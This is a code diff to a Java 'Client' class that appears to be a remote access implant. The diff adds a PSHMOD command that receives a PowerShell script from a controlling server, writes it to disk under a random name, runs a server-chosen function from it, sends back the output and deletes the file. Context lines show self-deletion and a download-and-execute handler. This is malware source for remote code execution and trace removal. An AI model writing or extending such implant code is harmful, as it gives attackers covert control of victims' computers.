@@ -248,8 +248,24 @@ public class Client {
                     f.deleteOnExit();
                     socket.close();
                     System.exit(0);
-                } else if (input.contains("BEACON")) {
-                    communicate("BEACON");
+                } else if (input.contains("PSHMOD")) {
+                    /*
+                    Server: PSHMOD len funcName
+                    Server: while bytes != -1 then send(byte[n])
+
+                     */
+                    communicate("PSHMOD");
+                    long len = Long.parseLong(input.split(" ")[1]);
+                    // Write ps1 to disk here TODO change addPshModuleAndExecute to not write to disk again
+                    File out = new File(".\\" + randTextAlphaRestricted(8) + ".ps1"); // TODO write to tmpdir or appdata
+                    FileOutputStream fos = new FileOutputStream(out);
+                    BufferedOutputStream bos = new BufferedOutputStream(fos);
+                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
+                    bos.close();
+                    fos.close();
+                    // PS1 is written, send it over to addPshModuleAndExecute
+
+                    communicate(addPshModuleAndExecute(out.getAbsolutePath(), input.split(" ")[2])); // Should change to addPshModuleAndExecute(String fPath, String funcName)
                 } else if (input.contains("DAE")){
                     communicate("DAE");
                     String url = input.split(" ")[1];
@@ -539,6 +555,32 @@ public class Client {
         }
         execNoComm(cmd);
     }
+
+    // fPath: absolute path to script file :: :: :: funcName: the name of the function to execute
+    private String addPshModuleAndExecute(String fPath, String funcName){
+        File scriptOut = new File(fPath);
+        // Imports the module, executes it, deletes file, removes module import
+        String cmd = "powershell.exe \"Import-Module " + scriptOut.getAbsolutePath() + " -Force; " + funcName + ";\"";
+        try {
+            // Execute command and get output
+            Process p = Runtime.getRuntime().exec(cmd);
+            p.waitFor();
+            BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String line;
+            String output = "";
+            while ((line = buf.readLine()) != null){
+                output += line + "\n";
+            }
+            // When its done reading, delete the file
+            scriptOut.delete();
+            return output;
+
+        } catch (IOException | InterruptedException e){
+            return "Could not write function to file: " + e.getMessage();
+        }
+    }
+
+    /// Util functions \\\
 
     public String randTextAlpha(int length){
         int leftLimit = 65; // letter 'A'
